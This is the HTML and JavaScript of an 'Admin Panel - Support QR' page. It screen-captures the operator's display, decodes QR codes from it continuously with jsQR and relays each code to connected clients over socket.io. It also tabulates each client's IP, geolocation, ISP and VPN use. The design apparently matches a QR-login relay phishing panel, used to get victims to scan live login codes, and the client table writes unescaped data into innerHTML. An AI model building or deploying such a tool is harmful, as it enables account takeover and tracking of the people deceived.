<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Admin Panel - Support QR</title>
<script src="/socket.io/socket.io.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
<style>
body {
  font-family: "Segoe UI", Arial, sans-serif;
  background: #f8f9fa;
  margin: 0;
  padding: 25px;
  display: flex;
  flex-direction: column;
  align-items: center;
}
.panel {
  background: white;
  padding: 20px;
  border-radius: 12px;
  box-shadow: 0 0 10px rgba(0,0,0,0.1);
  width: 100%;
  max-width: 900px;
}
.controls {
  display: flex;
  flex-wrap: wrap;
  gap: 10px;
  justify-content: center;
  margin-bottom: 15px;
}
button, input {
  padding: 8px 14px;
  border: none;
  border-radius: 6px;
  font-weight: 600;
  cursor: pointer;
}
button.start { background: #007bff; color: white; }
button.stop { background: #dc3545; color: white; }
button.hide { background: #6c757d; color: white; }
button.pause { background: #ffc107; color: black; }
button:hover { opacity: 0.9; }
#qrPreview {
  background: #fff;
  border-radius: 10px;
  padding: 20px;
  box-shadow: 0 0 6px rgba(0,0,0,0.1);
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 260px;
  margin-bottom: 20px;
}
#statusText { text-align: center; font-weight: bold; margin-bottom: 10px; }
#clientTable {
  width: 100%;
  border-collapse: collapse;
  font-size: 0.9rem;
}
#clientTable th, #clientTable td {
  border: 1px solid #ddd;
  padding: 6px 8px;
  text-align: center;
}
#clientTable th { background: #e9ecef; }
.intervalBox { display: flex; align-items: center; gap: 5px; }
.intervalBox input {
  width: 80px;
  border: 1px solid #ccc;
  text-align: right;
}
video { display:none; }
</style>
</head>
<body>
<div class="panel">
  <h2>Admin Panel - Support QR</h2>

  <div class="controls">
    <button class="start" id="startBtn">Start Stream</button>
    <button class="stop" id="stopBtn">Stop Stream</button>
    <button class="hide" id="hideBtn">Hide</button>
    <button class="pause" id="pauseBtn">Pause</button>
    <div class="intervalBox">
      <label>Scan Interval (s):</label>
      <input id="intervalInput" type="number" step="0.05" min="0.25" max="5" value="0.5">
    </div>
  </div>

  <div id="qrPreview">No active QR</div>
  <div id="statusText">Status: Inactive</div>

  <video id="video" autoplay muted></video>
  <canvas id="canvas"></canvas>

  <table id="clientTable">
    <thead>
      <tr>
        <th>Name</th><th>IP</th><th>City</th><th>Region</th>
        <th>Country</th><th>ISP</th><th>VPN</th><th>Ping (ms)</th>
      </tr>
    </thead>
    <tbody id="clientBody"></tbody>
  </table>
</div>

<script>
const socket = io();
let isStreaming = false;
let isHidden = false;
let isPaused = false;
let currentQR = null;
let scanInterval = 500; // 0.5s default
let stream = null;
let detectLoop = null;

const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const hideBtn = document.getElementById('hideBtn');
const pauseBtn = document.getElementById('pauseBtn');
const intervalInput = document.getElementById('intervalInput');
const qrPreview = document.getElementById('qrPreview');
const statusText = document.getElementById('statusText');
const clientBody = document.getElementById('clientBody');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

socket.emit('join', 'admin');

socket.on('state', (s) => {
  isStreaming = s.isStreaming;
  isHidden = s.isHidden;
  currentQR = s.currentQrValue;
  updateStatus();
  updatePreview();
});
socket.on('client_list', updateClients);
socket.on('hide_state', (hidden) => {
  isHidden = hidden;
  updateStatus();
  updatePreview();
});

// --- QR preview from server ---
socket.on('qr_preview', (val) => {
  if (!isStreaming || isPaused) return;
  if (!isHidden && val) {
    currentQR = val;
    qrPreview.innerHTML =
      `<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(val)}" alt="QR">`;
  }
});

function updateStatus() {
  let status = [];
  if (isStreaming) status.push('Streaming');
  if (isHidden) status.push('Hidden');
  if (isPaused) status.push('Paused');
  statusText.textContent = `Status: ${status.length ? status.join(' / ') : 'Inactive'}`;
}
function updatePreview() {
  if (isHidden) qrPreview.textContent = 'QR is hidden';
  else if (!currentQR) qrPreview.textContent = 'No active QR';
  else qrPreview.innerHTML =
    `<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(currentQR)}" alt="QR">`;
}

// --- Start screen share & detection ---
startBtn.onclick = async () => {
  try {
    stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
    video.srcObject = stream;
    isStreaming = true;
    socket.emit('start_stream');
    runDetection();
    updateStatus();
  } catch (err) {
    alert('Screen sharing failed: ' + err.message);
  }
};

stopBtn.onclick = () => {
  if (detectLoop) clearInterval(detectLoop);
  if (stream) stream.getTracks().forEach(t => t.stop());
  isStreaming = false;
  currentQR = null;
  socket.emit('stop_stream');
  updatePreview();
  updateStatus();
};

hideBtn.onclick = () => {
  isHidden = !isHidden;
  socket.emit('toggle_hide', isHidden);
  hideBtn.textContent = isHidden ? 'Unhide' : 'Hide';
  updateStatus();
  updatePreview();
};

pauseBtn.onclick = () => {
  isPaused = !isPaused;
  pauseBtn.textContent = isPaused ? 'Resume' : 'Pause';
  updateStatus();
};

// --- Custom interval ---
intervalInput.oninput = () => {
  let val = parseFloat(intervalInput.value);
  if (isNaN(val) || val < 0.25) val = 0.25;
  if (val > 5) val = 5;
  scanInterval = val * 1000;
  if (detectLoop) {
    clearInterval(detectLoop);
    runDetection();
  }
};

// --- QR Detection loop ---
function runDetection() {
  if (detectLoop) clearInterval(detectLoop);
  const ctx = canvas.getContext('2d');
  detectLoop = setInterval(() => {
    if (!isStreaming || isPaused || !video.videoWidth) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const code = jsQR(imgData.data, imgData.width, imgData.height);
    if (code && code.data && code.data !== currentQR) {
      currentQR = code.data;
      if (!isHidden) {
        qrPreview.innerHTML =
          `<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(code.data)}" alt="QR">`;
      }
      socket.emit('qr_update', code.data);
    }
  }, scanInterval);
}

// --- Client list ---
function updateClients(list) {
  clientBody.innerHTML = '';
  list.forEach(c => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${c.username}</td>
      <td>${c.ip}</td>
      <td>${c.city}</td>
      <td>${c.region}</td>
      <td>${c.country} ${c.countryFlag || ''}</td>
      <td>${c.isp}</td>
      <td>${c.vpn ? 'Yes' : 'No'}</td>
      <td>${c.ping}</td>
    `;
    clientBody.appendChild(tr);
  });
}
</script>
</body>
</html>
